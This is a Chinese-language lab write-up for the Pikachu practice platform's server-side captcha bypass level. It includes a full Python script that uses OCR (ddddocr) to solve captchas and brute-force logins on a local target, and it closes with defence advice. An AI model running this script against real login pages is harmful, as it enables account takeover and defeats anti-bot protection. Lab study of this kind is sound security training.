【Pikachu】Web-暴力破解-验证码绕过(on server) Writeup

操作者：何芊宏 | 操作日期：2026.9.26 | 分类：Pikachu | 标签：Pikachu, Web, 暴力破解, 验证码绕过, Python, ddddocr

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - 暴力破解 (Burte Force)
  • 题目名称：验证码绕过 (on server)
  • 目标：页面增加了服务端验证码，但存在逻辑缺陷。需要绕过验证码机制，自动化爆破出正确的账号密码。

2. 解题思路与知识点

漏洞原理：

服务端虽然增加了验证码，但验证码并没有和用户会话（Session）进行严格的绑定，或者验证码在验证成功后并没有被销毁，导致存在验证码复用漏洞。

工具选型与心路历程：
  • Burp Suite 社区版：虽然可以配置 Intruder，但由于社区版限速（每秒1个请求），导致发起爆破时等待时间过长。Pikachu 的 Session 生命周期极短，往往还没跑完，验证码就失效了，引发 验证码错误。
  • Python 自动化脚本：为了实现极速爆破，改用 Python 的 requests 库维持会话，并结合 ddddocr 自动识别验证码，每秒钟可以发起多次请求，完美避开 Session 过期问题。

3. 操作步骤

第一步：环境搭建与踩坑（安装 ddddocr）

操作： 在 VS Code 终端运行：pip install ddddocr requests

踩坑记录：直接使用官方源下载 ddddocr（包含约76MB的AI模型文件）极慢，速度仅 20kB/s，预计需要 50 多分钟。

解决办法：更换为清华大学国内镜像源进行下载。命令为：pip install ddddocr -i https://pypi.tuna.tsinghua.edu.cn/simple，几秒内即下载安装完毕。

第二步：编写全自动爆破脚本

操作： 在 VS Code 新建 bf_server.py，粘贴以下代码：

import requests
import ddddocr
import time

# ================== 配置区域 ==================
# 目标URL（登录提交接口）
target_url = "http://127.0.0.1/pikachu/vul/burteforce/bf_server.php"
# 验证码图片接口（Pikachu 默认图片生成路径）
vcode_url = "http://127.0.0.1/pikachu/inc/showvcode.php"

# 精简字典，方便快速演示
users = ["admin", "test", "pikachu", "root"]
passwords = ["123456", "abc123", "000000", "password", "admin888"]
# ==============================================

# 初始化 OCR 识别引擎
ocr = ddddocr.DdddOcr()

print("[*] 开始全自动爆破（自动识别动态验证码）...")

# 双重循环遍历用户名和密码字典
for user in users:
    for pwd in passwords:
        # 关键点：每次请求前创建一个新的 Session，保证 Cookie 独立
        session = requests.Session()
        
        try:
            # 1. 脚本自动请求一张最新的验证码图片
            img_res = session.get(vcode_url, timeout=5)
            
            # 2. ddddocr 自动识别图片中的字符
            vcode = ocr.classification(img_res.content)
            print(f"[*] 尝试: {user}/{pwd} | 自动识别验证码: {vcode}")
            
            # 3. 构造登录请求（使用同一个 session，确保验证码和Cookie对应）
            data = {
                "username": user,
                "password": pwd,
                "vcode": vcode,
                "submit": "Login"
            }
            res = session.post(target_url, data=data, timeout=5)
            
            # 4. 判断响应结果
            if "login success" in res.text:
                print(f"\n[+] 爆破成功！账号: {user}  密码: {pwd}\n")
                exit() # 找到密码后直接退出程序
            elif "验证码错误" in res.text:
                print("    [-] 验证码识别错误，自动跳过...")
                continue # OCR 偶尔会认错，跳过本次继续下一次
            else:
                print("    [-] 账号或密码错误")
                
        except Exception as e:
            print(f"[!] 请求异常: {e}")
        
        time.sleep(0.1) # 稍微延时，避免请求过快把本地靶场打挂

print("[*] 爆破结束，未找到正确密码。")

脚本核心逻辑说明：

  • requests.Session()：创建一个会话对象。这非常重要！因为验证码图片是绑定在这个 Session 的 Cookie 上的。如果用普通请求，获取图片的 Cookie 和提交表单的 Cookie 不一致，就会报验证码错误。
  • ocr.classification()：这是 ddddocr 库的核心方法，传入图片的二进制内容，返回识别出的字符串。
  • continue 和 exit()：识别错误时，使用 continue 跳过本次循环，继续下一次尝试；如果成功匹配到 login success，则直接 exit() 退出脚本。

第三步：运行脚本，成功爆破

操作： 终端运行 python bf_server.py。

回显结果：脚本自动识别出验证码 tf1df9，并在尝试第一组账号时即告成功：[+] 爆破成功！账号: admin 密码: 123456。

验证结果： 回到浏览器，输入 admin / 123456 及任意验证码（只要第一次输入正确），成功返回 login success，通关！

4. 踩坑记录与复盘

  • 坑1：Burp Suite 社区版限速与 Session 超时。最初使用 Burp 进行手动抓包和 Intruder 爆破。发现所有请求长度一致。排查 Response 发现提示“验证码已失效”。原因是抓包后配置字典耗时过长，Pikachu 服务端 Session 或验证码有极短的生命周期限制。转而使用 Python 脚本实现毫秒级自动化请求，解决了时间差问题。
  • 坑2：Python 依赖包下载极慢。ddddocr 包含 AI 模型权重文件，直接从 PyPI 官方源下载仅 20kB/s。通过更换国内清华镜像源（-i 参数）解决。
  • 坑3：OCR 识别偶尔会出错。脚本中使用 elif "验证码错误" in res.text: continue，遇到识别错误时自动跳过当前组合，极大地提升了自动化脚本的健壮性。

5. 知识总结

  • 服务端验证码绕过核心逻辑：如果服务端未将验证码与当前会话严格绑定，或者验证成功后未销毁验证码，攻击者就可以实现“一次识别，多次复用”。
  • 自动化脚本的降维打击：面对带有验证码的场景，使用 ddddocr 结合 requests.Session()，可以做到“取图 -> 识别 -> 提交”一气呵成，彻底打破手工抓包的时间瓶颈。
  • 防御建议：验证码必须一次性使用，验证成功后立即在 Session 中销毁；验证码必须设置较短的有效期（如 60 秒）；同时应增加登录失败次数限制。
